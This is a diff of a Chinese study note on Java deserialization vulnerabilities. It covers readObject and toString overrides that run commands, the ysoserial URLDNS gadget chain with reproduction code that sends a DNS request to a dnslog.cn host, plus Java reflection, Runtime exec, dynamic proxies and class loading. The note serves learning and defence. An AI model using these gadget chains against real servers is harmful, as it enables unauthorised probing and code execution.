@@ -17,38 +17,36 @@ tocOpen: true
 
 ## 1.1 什么是序列化&反序列化
 
-序列化：将内存中的对象压缩成字节流  
+序列化：将内存中的对象压缩成字节流
 反序列化：将字节流转化成内存中的对象
 
-
-
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311749235.png)
-
-
 
 ## 1.2 为什么有序列化技术
 
 序列化与反序列化的设计就是用来传输数据的。
 
-**应用场景**  
-(1) 想把内存中的对象保存到一个文件中或者是数据库当中。  
-(2) 用套接字在网络上传输对象。  
+**应用场景**
+(1) 想把内存中的对象保存到一个文件中或者是数据库当中。
+(2) 用套接字在网络上传输对象。
 (3) 通过RMI传输对象的时候。
 
 ## 1.3 几种常见的序列化和反序列化协议
+
 + XML
 + SOAP（Simple Object Access protocol） 是一种被广泛应用的，基于 XML 为序列化和反序列化协议的结构化消息传递协议
 + JSON（Javascript Object Notation）
 + Protobuf
 
 ## 1.4 序列化和反序列化实现
+
 简单分析 Java 的对象序列化的不同写法：
 
 俩种写法本质上都是 Java 的对象序列化，但它们在底层的 IO 流使用方式上略有不同：
 
 **写法一：**
 
-```plain
+```java
 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
 ```
 
@@ -61,16 +59,16 @@ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"))
 
 **写法二：（IDEA推荐）**
 
-```plain
+```java
 ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get("ser.bin")));
 ```
 
-`**Paths.get("ser.bin")**`
+**`Paths.get("ser.bin")`**
 
 + 使用 `java.nio.file.Path` 来表示文件路径，比 `String` 更灵活、可组合。
 + 可以方便地处理跨平台路径，比如 `"folder/subfolder/file.txt"`
 
-`**Files.newOutputStream(path)**`
+**`Files.newOutputStream(path)`**
 
 + 返回一个 `OutputStream`，功能类似 `FileOutputStream`。
 + 基于 NIO（New IO）库，提供更多文件操作选项，
@@ -79,8 +77,6 @@ ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get(
 
 + 更现代化的写法，灵活性高，支持 NIO 的各种特性。
 + 更适合与 `Path`、`Files` API 配合，比如检查文件是否存在、创建目录等。
-
-
 
 ```java
 import java.io.Serializable;
@@ -169,37 +165,35 @@ public class Unserialize {
 }
 ```
 
-<font style="color:#080808;background-color:#ffffff;">Serialization 创建 Person 对象并将其序列化保存到文件 ser.bin</font>
+Serialization 创建 Person 对象并将其序列化保存到文件 ser.bin 
 
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311749774.png)
 
-生成的 <font style="color:#080808;background-color:#ffffff;"> ser.bin </font>
+生成的  ser.bin 
 
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311750280.png)
 
-<font style="color:#080808;background-color:#ffffff;">Unserialize  从 ser.bin 文件里恢复（反序列化）一个对象  </font>
+`<font style="color:#080808;background-color:#ffffff;">`Unserialize  从 ser.bin 文件里恢复（反序列化）一个对象  `</font>`
 
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311750920.png)
-
-
 
 **总的来说：**
 
  在 `serialize` 方法中，先通过输出流对象 `new FileOutputStream("ser.bin")`【等价于 `Files.newOutputStream(Paths.get("ser.bin"))`】创建文件输出通道，然后将输出流包装成 `ObjectOutputStream`，再调用 `writeObject` 方法将对象序列化并写入文件。
 
- 在 `unserialize` 方法中，先通过输入流对象 `new FileInputStream("ser.bin")`【等价于 `Files.newInputStream(Paths.get("ser.bin"))`】创建文件输入通道，然后将输入流包装成 `ObjectInputStream`，再调用 `readObject` 方法将文件中的二进制数据读取出来并反序列化成对象。  
-
-
+ 在 `unserialize` 方法中，先通过输入流对象 `new FileInputStream("ser.bin")`【等价于 `Files.newInputStream(Paths.get("ser.bin"))`】创建文件输入通道，然后将输入流包装成 `ObjectInputStream`，再调用 `readObject` 方法将文件中的二进制数据读取出来并反序列化成对象。
 
 ## 1.5 为什么会产生安全问题？
+
 只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力。
 
-1. <font style="color:rgb(51, 51, 51);">入口类的</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">readObject</font>`<font style="color:rgb(51, 51, 51);">直接调用危险方法</font>
-2. <font style="color:rgb(51, 51, 51);">入口参数中包含可控类，该类有危险方法，readObject 时调用</font>
-3. <font style="color:rgb(51, 51, 51);">入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用</font>
-4. <font style="color:rgb(51, 51, 51);">构造函数/静态代码块等类加载时隐式执行</font>
+1. 入口类的`readObject`直接调用危险方法
+2. 入口参数中包含可控类，该类有危险方法，`readObject` 时调用
+3. 入口类参数中包含可控类，该类又调用其他有危险方法的类，`readObject` 时调用
+4. 构造函数/静态代码块等类加载时隐式执行
 
 ### 1.5.1 入口类的 `readObject` 直接调用危险方法
+
 Person 类中写入：
 
 ```java
@@ -211,20 +205,17 @@ private void readObject(ObjectInputStream ois) throws IOException, ClassNotFound
 }
 ```
 
- 反序列化时 JVM 会先调用 Person 类中自定义的 `readObject` 方法，而其中加入了命令执行逻辑，因此对象恢复过程中就触发了计算器的运行。  
+ 反序列化时 JVM 会先调用 Person 类中自定义的 `readObject` 方法，而其中加入了命令执行逻辑，因此对象恢复过程中就触发了计算器的运行。
 
 依次执行序列化、反序列化，弹出计算器：
 
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311751914.png)
 
+### 1.5.2 入口参数中包含可控类，该类有危险方法，readObject 时调用
 
-
-### 1.5.2 入口参数中包含可控类，该类有危险方法，readObject 时调用  
 为什么HashMap要自己实现writeObject和readObject方法？
 
 [https://juejin.cn/post/6844903954774491144](https://juejin.cn/post/6844903954774491144)
-
-
 
 ```java
 import java.io.*;
@@ -258,16 +249,15 @@ public class Test01 implements Serializable {
 
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752489.png)
 
-`URL` 类在 JDK 里是自带的类，它的 `hashCode()` 方法里会触发 DNS 解析  
+`URL` 类在 JDK 里是自带的类，它的 `hashCode()` 方法里会触发 DNS 解析
 
- 入口参数里包含了可控的类（`URL`），而该类在反序列化过程中会自动调用危险方法（`hashCode()` 触发 DNS 解析），那么在 `readObject()` 反序列化时就会执行这些危险逻辑，造成安全风险。  
-
-
+ 入口参数里包含了可控的类（`URL`），而该类在反序列化过程中会自动调用危险方法（`hashCode()` 触发 DNS 解析），那么在 `readObject()` 反序列化时就会执行这些危险逻辑，造成安全风险。
 
 #### HashMap 找入口类分析：
-本例中的代码利用了 <font style="color:#080808;background-color:#ffffff;">HashMap<URL, Integer></font>，那么看看为什么它会造成漏洞
 
-跟进 HashMap ，此处继承了 <font style="color:#080808;background-color:#ffffff;">Serializable</font>
+本例中的代码利用了 `<font style="color:#080808;background-color:#ffffff;">`HashMap<URL, Integer>`</font>`，那么看看为什么它会造成漏洞
+
+跟进 HashMap ，此处继承了 `<font style="color:#080808;background-color:#ffffff;">`Serializable`</font>`
 
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752099.png)
 
@@ -279,22 +269,16 @@ public class Test01 implements Serializable {
 
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752777.png)
 
-跟进 hashCode,<font style="color:rgb(80, 80, 92);">hashCode 位置处于 Object 类当中</font>
+跟进 hashCode,`<font style="color:rgb(80, 80, 92);">`hashCode 位置处于 Object 类当中`</font>`
 
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752211.png)
 
 这样，HashMap 完美满足了可序列化、重写 readObject、接收任意对象作为参数、JDK 自带的入口类条件。
 
+### `<font style="color:rgb(51, 51, 51);">`1.5.3 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用`</font>`
 
+### `<font style="color:rgb(51, 51, 51);">`1.5.4 构造函数/静态代码块等类加载时隐式执行`</font>`
 
-
-
-
-
-### <font style="color:rgb(51, 51, 51);">1.5.3 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用</font>
-
-
-### <font style="color:rgb(51, 51, 51);">1.5.4 构造函数/静态代码块等类加载时隐式执行</font>
 ```java
 public String toString() {
     	 try {
@@ -308,38 +292,35 @@ public String toString() {
 System.out.println(obj);
 ```
 
- 在 `toString()` 中写入危险逻辑，那么只要对象在打印时被隐式调用，就会自动执行恶意代码  
-
-
+ 在 `toString()` 中写入危险逻辑，那么只要对象在打印时被隐式调用，就会自动执行恶意代码
 
 ## 1.6 找漏洞的三个条件
-首先一个前提：**<font style="color:rgb(80, 80, 92);">继承了 </font>**<font style="color:#080808;background-color:#ffffff;">Serializable</font><font style="color:rgb(80, 80, 92);">，使对象可序列化</font>
 
-+ 入口类 source	
-    - 可序列化
-    - 重写 readObject 调用常见函数
-    - 接收任意对象作为参数，参数类型宽泛
-    - 最后 JDK 自带
+首先一个前提：**`<font style="color:rgb(80, 80, 92);">`继承了 `</font>`**`<font style="color:#080808;background-color:#ffffff;">`Serializable`</font><font style="color:rgb(80, 80, 92);">`，使对象可序列化`</font>`
+
++ 入口类 source
+  - 可序列化
+  - 重写 readObject 调用常见函数
+  - 接收任意对象作为参数，参数类型宽泛
+  - 最后 JDK 自带
 + 调用链 gadget chain
-+ 执行类 sink 
-    - <font style="color:rgb(80, 80, 92);">RCE SSRF 写文件等等</font>
++ 执行类 sink
+  - `<font style="color:rgb(80, 80, 92);">`RCE SSRF 写文件等等`</font>`
 
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311752309.png)
 
+# `<font style="color:rgb(76, 76, 87);">`2、Java 反射+URLDNS 链`</font>`
 
-
-# <font style="color:rgb(76, 76, 87);">2、Java 反射+URLDNS 链</font>
 ## 2.1 Java 反射理解
-> <font style="color:rgb(37, 41, 51);">谈谈Java反射：从入门到实践，再到原理</font>
+
+> `<font style="color:rgb(37, 41, 51);">`谈谈Java反射：从入门到实践，再到原理`</font>`
 >
 > [https://juejin.cn/post/6844904025607897096](https://juejin.cn/post/6844904025607897096)
->
-
-
 
 反射的作用：让 Java 具有动态性
 
 ### 2.1.1 静态语言 VS 动态语言
+
 Java 本身使一种静态语言，编译时就决定了类型：
 
 ```java
@@ -361,18 +342,13 @@ $var = 123;      // 运行时再赋值，现在 $var 就是整数
 
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753415.png)
 
+### `<font style="color:rgb(76, 76, 87);">`2.1.2 正射与反射`</font>`
 
-
-### <font style="color:rgb(76, 76, 87);">2.1.2 正射与反射</font>
 [官方对反射的解释](https://docs.oracle.com/javase/8/docs/technotes/guides/reflection/index.html)
 
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311753682.png)
 
-
-
 **反射机制**使Java代码能够探查已加载类的字段、方法及构造函数信息，并在安全限制范围内，通过反射字段、方法和构造函数对这些底层对应元素进行操作。该 API 既支持需要访问目标对象公共成员（基于其运行时类）的应用程序，也支持访问给定类声明成员的场景，同时允许程序抑制默认的反射访问控制。
-
-
 
 **正射（直接调用）：在未运行时（编译时）已经知道了要运行的类** **Student**
 
@@ -383,28 +359,30 @@ $var = 123;      // 运行时再赋值，现在 $var 就是整数
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311754403.png)
 
 ### 2.1.3 Class 对象理解
-<font style="color:rgb(37, 41, 51);"> 先理解 ：</font>**<font style="color:rgb(37, 41, 51);">RTTI（Run-Time Type Identification）运行时类型识别</font>**
+
+`<font style="color:rgb(37, 41, 51);">` 先理解 ：`</font>`**`<font style="color:rgb(37, 41, 51);">`RTTI（Run-Time Type Identification）运行时类型识别`</font>`**
 
 Java 在运行时识别对象和类的信息主要以俩种方式：一种是 RTTI ，它假定我们在编译期已知道了所有类型；另一种是 反射，在运行时发现和使用类的信息。
 
-**<font style="color:rgb(37, 41, 51);">每个类都有一个Class对象</font>**<font style="color:rgb(37, 41, 51);">，每当编译一个新类就产生一个Class对象（更恰当地说，是被保存在一个同名的.class文件中）。</font>
+**`<font style="color:rgb(37, 41, 51);">`每个类都有一个Class对象`</font>`**`<font style="color:rgb(37, 41, 51);">`，每当编译一个新类就产生一个Class对象（更恰当地说，是被保存在一个同名的.class文件中）。`</font>`
 
-<font style="color:rgb(37, 41, 51);">比如创建一个Student类，那么，JVM就会创建一个Student对应Class类的Class对象，该Class对象保存了Student类相关的类型信息。</font>
+`<font style="color:rgb(37, 41, 51);">`比如创建一个Student类，那么，JVM就会创建一个Student对应Class类的Class对象，该Class对象保存了Student类相关的类型信息。`</font>`
 
-**<font style="color:rgb(37, 41, 51);">Class类的对象作用</font>**<font style="color:rgb(37, 41, 51);">是运行时提供或获得某个对象的类型信息</font>
+**`<font style="color:rgb(37, 41, 51);">`Class类的对象作用`</font>`**`<font style="color:rgb(37, 41, 51);">`是运行时提供或获得某个对象的类型信息`</font>`
 
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311754008.webp)
 
-
-
 ## 2.2 反射使用
+
 ### 2.2.1 反射中极为重要的方法
+
 + 获取类的方法：forName
 + 实例化类对象的方法：newInstance
 + 获取函数的方法：getMethod
 + 执行函数的方法：invoke
 
 ### 2.2.2 获取 Class 类对象
+
 + 已知**具体的类**，通过类的 **class** 属性获取，
 
 ```java
@@ -486,6 +464,7 @@ class Teacher extends Person {
 ```
 
 ### 2.2.3 实例化/创建对象
+
 > 因为 Class 类是 `private` 私有属性，我们也无法通过创建对象的方式来获取 class 对象
 
 + 通过 Class 的 **newInstance() **方法
@@ -505,14 +484,13 @@ System.out.println(p1);
         System.out.println(p2);
 ```
 
-
-
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755212.png)
 
 ### 2.2.3 获取类里面的属性 Filed
-+ getField(<font style="color:#080808;background-color:#ffffff;">String name</font>)：指定变量名，可获得 public 类型的属性
+
++ getField(`<font style="color:#080808;background-color:#ffffff;">`String name`</font>`)：指定变量名，可获得 public 类型的属性
 + getFields()：获得类的 public 类型的属性
-+ getDeclaredField(<font style="color:#080808;background-color:#ffffff;">String name</font>)：指定变量名，可获得所有类型的属性
++ getDeclaredField(`<font style="color:#080808;background-color:#ffffff;">`String name`</font>`)：指定变量名，可获得所有类型的属性
 + getDeclaredFields()：获得类的所有类型的属性
 
 ```java
@@ -543,38 +521,36 @@ System.out.println(allfield);
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755559.png)
 
 ### 2.2.4 获取类的方法 Method
+
 + getMethod(String name, Class<?>... parameterTypes)：指定方法名和参数类型，可获得 public 方法（包含父类继承的）。
 + getMethods()：获得类及父类的所有 public 方法。
 + getDeclaredMethod(String name, Class<?>... parameterTypes)：指定方法名和参数类型，可获得本类声明的任意方法（包括 private、protected、默认、public）。
 + getDeclaredMethods()：获得类中声明的所有方法（不含父类）。
 
 ### 2.2.5 获取类的构造器 Constructor
+
 + getConstructor(Class<?>... parameterTypes)：指定参数类型，可获得 public 构造器。
 + getConstructors()：获得类的所有 public 构造器。
 + getDeclaredConstructor(Class<?>... parameterTypes)：指定参数类型，可获得类的任意构造器（包括 private）。
 + getDeclaredConstructors()：获得类的所有构造器（不论修饰符）。
 
-
-
 ## 2.3 URLDNS 链
+
 [https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)
 
 URLDNS 是  ysoserial 中的一个利用链：
 
- *   Gadget Chain:
-
- *     HashMap.readObject()
-
- *       HashMap.putVal()
-
- *         HashMap.hash()
-
- *           URL.hashCode()
+* Gadget Chain:
+* HashMap.readObject()
+* HashMap.putVal()
+* HashMap.hash()
+* URL.hashCode()
 
 ### 分析：
-首先是因为 HashMap（java/util/HashMap.java） 中重写了 readObject() 方法，HashMap.readObject() 通过 <font style="color:#080808;background-color:#ffffff;">K key = (K) s.readObject(); 进行反序列化，之后调用  putVal() -> hash()，在 hash() 中调用了 hashCode() ；【关于 HashMap 的分析：</font>[HashMap 找入口类分析](#KmszU)<font style="color:#080808;background-color:#ffffff;">】</font>
 
-<font style="color:#080808;background-color:#ffffff;">接下来查看 URL（java/net/URL.java），URL 中继承了 </font>**<font style="color:#080808;background-color:#ffffff;">Serializable，</font>**
+首先是因为 HashMap（java/util/HashMap.java） 中重写了 readObject() 方法，HashMap.readObject() 通过 `<font style="color:#080808;background-color:#ffffff;">`K key = (K) s.readObject(); 进行反序列化，之后调用  putVal() -> hash()，在 hash() 中调用了 hashCode() ；【关于 HashMap 的分析：`</font>`[HashMap 找入口类分析](#KmszU)`<font style="color:#080808;background-color:#ffffff;">`】`</font>`
+
+`<font style="color:#080808;background-color:#ffffff;">`接下来查看 URL（java/net/URL.java），URL 中继承了 `</font>`**`<font style="color:#080808;background-color:#ffffff;">`Serializable，`</font>`**
 
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755415.png)
 
@@ -582,20 +558,20 @@ URLDNS 是  ysoserial 中的一个利用链：
 
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755653.png)
 
-`getHostAddress(u)` 会尝试把 URL 中的主机名解析成一个 `InetAddress` 对象（也就是 IP 地址）， 如果主机名解析成功（`addr` 不为 null），就把解析出来的 IP 地址的 `hashCode()` 加入到 `h`（整个 URL 的哈希值）里  ； 如果 DNS 没解析成功（`addr == null`），那就直接取 URL 原始的 `host` 字符串  
+`getHostAddress(u)` 会尝试把 URL 中的主机名解析成一个 `InetAddress` 对象（也就是 IP 地址）， 如果主机名解析成功（`addr` 不为 null），就把解析出来的 IP 地址的 `hashCode()` 加入到 `h`（整个 URL 的哈希值）里  ； 如果 DNS 没解析成功（`addr == null`），那就直接取 URL 原始的 `host` 字符串
 
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311755421.png)
 
-跟进 getHostAddress，<font style="color:#080808;background-color:#ffffff;">InetAddress.getByName(host)方法会去解析主机名，</font>
+跟进 getHostAddress，`<font style="color:#080808;background-color:#ffffff;">`InetAddress.getByName(host)方法会去解析主机名，`</font>`
 
 + 如果 `host` 是 IP 地址，直接转换成 `InetAddress`，不会走 DNS
 + 如果 `host` 是域名，这里就会向系统的 **DNS 解析器** 发起请求，解析成 IP
 
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311756610.png)
 
-****
+---
 
-****
+---
 
 **完整的利用链：**
 
@@ -607,15 +583,14 @@ URLDNS 是  ysoserial 中的一个利用链：
 
 -> URL.hashCode()
 
--> <font style="color:#080808;background-color:#ffffff;">URLStreamHandler.hashCode()</font>
+-> `<font style="color:#080808;background-color:#ffffff;">`URLStreamHandler.hashCode()`</font>`
 
--> <font style="color:#080808;background-color:#ffffff;">URLStreamHandler.hashCode.</font>getHostAddress()
+-> `<font style="color:#080808;background-color:#ffffff;">`URLStreamHandler.hashCode.`</font>`getHostAddress()
 
--> getHostAddress.<font style="color:#080808;background-color:#ffffff;">InetAddress.getByName()  【这里发出 DNS 请求】</font>
-
-
+-> getHostAddress.`<font style="color:#080808;background-color:#ffffff;">`InetAddress.getByName()  【这里发出 DNS 请求】`</font>`
 
 ### 复现：
+
 ```java
 HashMap<URL,Integer> hashmap = new HashMap<URL,Integer>();
 hashmap.put(new URL("http://9zuzrq.dnslog.cn"),1);
@@ -632,11 +607,7 @@ serialize(hashmap);
 
 我们知道，第一次将 key（也就是 dnslog）传入 URL.hashCode 时，hashCode == -1（-1 表示没有计算过），执行 hashCode = handler.hashCode(this); ，而根据之前的分析，  handler.hashCode  -> getHostAddress -> InetAddress.getByName(host) -> 发起dns请求，所以说，序列化本身没有发起 dns请求，是因为 HashMap 在序列化过程中调用了 URL.hashCode() ，URL.hashCode() 解析主机名发起 DNS 请求。
 
-
-
 那么如何不在第一次发起请求？
-
-
 
 ```java
 HashMap<URL,Integer> hashmap = new HashMap<URL,Integer>();
@@ -663,9 +634,8 @@ serialize(hashmap);
 
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757978.png)
 
-
-
 ### 学习 ysoserial 中的 URLDNS：
+
 ```java
 @SuppressWarnings({ "rawtypes", "unchecked" })
 @PayloadTest(skip = "true")
@@ -717,13 +687,10 @@ public class URLDNS implements ObjectPayload<Object> {
 }
 ```
 
-
-
-ysoserial 为了避免第一次序列化时就发起 DNS 请求，它使用了 SilentURLStreamHandler() 内部类自定义了 handler ，覆盖原来的 URL.hashCode.<font style="color:#080808;background-color:#ffffff;">handler，当第一次请求时，进入 SilentURLStreamHandler.getHostAddress  和  SilentURLStreamHandler.openConnection  ，都返回 null ，避免 DNS 请求和访问网络。这样在创建 payload 的阶段就不会触发 DNS ，而反序列化时，hashCode == -1，触发原本的 getHostAddress 触发 DNS 请求。</font>
-
-
+ysoserial 为了避免第一次序列化时就发起 DNS 请求，它使用了 SilentURLStreamHandler() 内部类自定义了 handler ，覆盖原来的 URL.hashCode.`<font style="color:#080808;background-color:#ffffff;">`handler，当第一次请求时，进入 SilentURLStreamHandler.getHostAddress  和  SilentURLStreamHandler.openConnection  ，都返回 null ，避免 DNS 请求和访问网络。这样在创建 payload 的阶段就不会触发 DNS ，而反序列化时，hashCode == -1，触发原本的 getHostAddress 触发 DNS 请求。`</font>`
 
 ## 2.4 利用 Runtime
+
 ```java
 package com.demo01;
 
@@ -752,17 +719,13 @@ public class Runtime {
 
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757810.png)
 
-
-
 # 3、JDK 动态代理
+
 参考文章：
 
 > [代理模式(狂神)](https://www.yuque.com/taohuayuanpang/kfw7zl/rpagg11nwkzm2qh2#nIfNv)
 >
-> <font style="color:rgb(25, 27, 31);">设计模式（四）——搞懂什么是代理模式</font>[https://zhuanlan.zhihu.com/p/72644638](https://zhuanlan.zhihu.com/p/72644638)
->
-
-  
+> `<font style="color:rgb(25, 27, 31);">`设计模式（四）——搞懂什么是代理模式`</font>`[https://zhuanlan.zhihu.com/p/72644638](https://zhuanlan.zhihu.com/p/72644638)
 
 **代理模式即 SpringAOP 的底层**
 
@@ -770,11 +733,10 @@ public class Runtime {
 
 原型：
 
-![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757644.png) 
-
-
+![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757644.png)
 
 ## 3.1 **静态代理**
+
 角色分析：
 
 + 抽象角色 ： 一般会使用接口或者抽象类来解决
@@ -791,8 +753,6 @@ public class Runtime {
 缺点：
 
 + 一个真实角色就会产生一个代理角色，代码量翻倍，开发效率会变低
-
-
 
 ```java
 package com.kuang.demo01;
@@ -875,8 +835,6 @@ public class Proxy implements Rent{
 ```
 
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757637.png)
-
-
 
 另一例:
 
@@ -976,38 +934,33 @@ public class Client {
 }
 ```
 
-
-
-<font style="color:rgb(255, 0, 0);">在不改变原来的代码的情况下，实现了对原有功能的增强，这是AOP中最核心的思想</font>
-
-
+`<font style="color:rgb(255, 0, 0);">`在不改变原来的代码的情况下，实现了对原有功能的增强，这是AOP中最核心的思想`</font>`
 
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757323.png)
 
-
-
 ## 3.2 动态代理
+
 + 动态代理和静态代理角色一样
 + 动态代理的代理类是动态生成的，不是我们直接写好的
 + 动态代理分为俩大类：基于接口的动态代理，基于类的动态代理
-    - 基于接口--JDK 动态代理
-    - 基于类--cglib
-    - java 字节码实现：javasist
+  - 基于接口--JDK 动态代理
+  - 基于类--cglib
+  - java 字节码实现：javasist
 
-<font style="color:#080808;background-color:#ffffff;">了解俩个类：</font>
+`<font style="color:#080808;background-color:#ffffff;">`了解俩个类：`</font>`
 
 + Proxy：代理
-+ <font style="color:#080808;background-color:#ffffff;">InvocationHandler：调用处理程序</font>
++ `<font style="color:#080808;background-color:#ffffff;">`InvocationHandler：调用处理程序`</font>`
 
-**<font style="color:rgb(255, 0, 0) !important;background-color:rgb(248, 248, 248) !important;">动态代理的好处</font>**
+**`<font style="color:rgb(255, 0, 0) !important;background-color:rgb(248, 248, 248) !important;">`动态代理的好处`</font>`**
 
-<font style="color:rgba(0, 0, 0, 0.9);">静态代理有的它都有，静态代理没有的，它也有！</font>
+`<font style="color:rgba(0, 0, 0, 0.9);">`静态代理有的它都有，静态代理没有的，它也有！`</font>`
 
-+ <font style="color:rgba(0, 0, 0, 0.9);">可以使得我们的真实角色更加纯粹 . 不再去关注一些公共的事情 .</font>
-+ <font style="color:rgba(0, 0, 0, 0.9);">公共的业务由代理来完成 . 实现了业务的分工 ,</font>
-+ <font style="color:rgba(0, 0, 0, 0.9);">公共业务发生扩展时变得更加集中和方便 .</font>
-+ <font style="color:rgba(0, 0, 0, 0.9);">一个动态代理 , 一般代理某一类业务</font>
-+ <font style="color:rgba(0, 0, 0, 0.9);">一个动态代理可以代理多个类，代理的是接口！</font>
++ `<font style="color:rgba(0, 0, 0, 0.9);">`可以使得我们的真实角色更加纯粹 . 不再去关注一些公共的事情 .`</font>`
++ `<font style="color:rgba(0, 0, 0, 0.9);">`公共的业务由代理来完成 . 实现了业务的分工 ,`</font>`
++ `<font style="color:rgba(0, 0, 0, 0.9);">`公共业务发生扩展时变得更加集中和方便 .`</font>`
++ `<font style="color:rgba(0, 0, 0, 0.9);">`一个动态代理 , 一般代理某一类业务`</font>`
++ `<font style="color:rgba(0, 0, 0, 0.9);">`一个动态代理可以代理多个类，代理的是接口！`</font>`
 
 案例一
 
@@ -1094,8 +1047,6 @@ public class Client {
 }
 ```
 
-
-
 案例二：
 
 ```java
@@ -1158,28 +1109,27 @@ public class Client {
 }
 ```
 
+# 4、类的动态加载
 
-
-# 4、类的动态加载 
-> <font style="color:rgb(33, 37, 41);">Java类加载机制和对象创建过程</font>
+> `<font style="color:rgb(33, 37, 41);">`Java类加载机制和对象创建过程`</font>`
 >
 > [https://segmentfault.com/a/1190000023876273](https://segmentfault.com/a/1190000023876273)
 >
-> <font style="color:rgb(60, 60, 67);">类加载过程详解</font>
+> `<font style="color:rgb(60, 60, 67);">`类加载过程详解`</font>`
 >
 > [https://javaguide.cn/java/jvm/class-loading-process.html](https://javaguide.cn/java/jvm/class-loading-process.html)
->
 
 ### 类加载过程：
+
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757858.png)
 
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757062.png)
 
 + **加载：**将类的 class 文件字节码加载到内存，并将静态数据转化为方法区的运行时数据结构，然后生成一个 java.lang.Class 对象
 + **链接：**将java类二进制数据合并到 JRE中
-    - **验证：**确保加载的类信息符合JVM规范，没有安全方面的问题
-    - **准备：**正式为类变量 （static） 分配内存并设置类变量默认初始值的阶段（所以说static在初始化之前就已经有了一个值），这些内存都将在方法区中进行分配
-    - **解析：**虚拟机将常量池内的符号引用替换为直接引用的过程
+  - **验证：**确保加载的类信息符合JVM规范，没有安全方面的问题
+  - **准备：**正式为类变量 （static） 分配内存并设置类变量默认初始值的阶段（所以说static在初始化之前就已经有了一个值），这些内存都将在方法区中进行分配
+  - **解析：**虚拟机将常量池内的符号引用替换为直接引用的过程
 + **初始化：**执行初始化方法 `<clinit> ()`方法的过程，是类加载的最后一步，这一步 JVM 才开始真正执行类中定义的 Java 程序代码(字节码)。`<clinit> ()`方法会将该类的静态变量合并。
 
 ```java
@@ -1217,9 +1167,8 @@ class A{
 }
 ```
 
-
-
 ### 类加载器：
+
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311758397.png)
 
 ```java
@@ -1285,55 +1234,31 @@ public class Test07 {
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311758656.png)
 
 ### 双亲委派机制
+
 参考：[https://javaguide.cn/java/jvm/classloader.html#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B](https://javaguide.cn/java/jvm/classloader.html#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B)
 
 [https://www.cnblogs.com/luckforefforts/p/13642685.html](https://www.cnblogs.com/luckforefforts/p/13642685.html)
 
-
-
-<font style="color:rgb(89, 97, 114);">如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的加载器都是如此，因此所有的类加载请求都会传给顶层的启动类加载器，只有当父加载器反馈自己无法完成该加载请求（该加载器的搜索范围中没有找到对应的类）时，子加载器才会尝试自己去加载。</font>
-
-
-
-
-
-
+`<font style="color:rgb(89, 97, 114);">`如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的加载器都是如此，因此所有的类加载请求都会传给顶层的启动类加载器，只有当父加载器反馈自己无法完成该加载请求（该加载器的搜索范围中没有找到对应的类）时，子加载器才会尝试自己去加载。`</font>`
 
 # 参考文章
 
-<font style="color:rgb(34, 34, 38);">java序列化与反序列化全讲解</font>
+`<font style="color:rgb(34, 34, 38);">`java序列化与反序列化全讲解`</font>`
 
 [https://blog.csdn.net/mocas_wang/article/details/107621010](https://blog.csdn.net/mocas_wang/article/details/107621010)
 
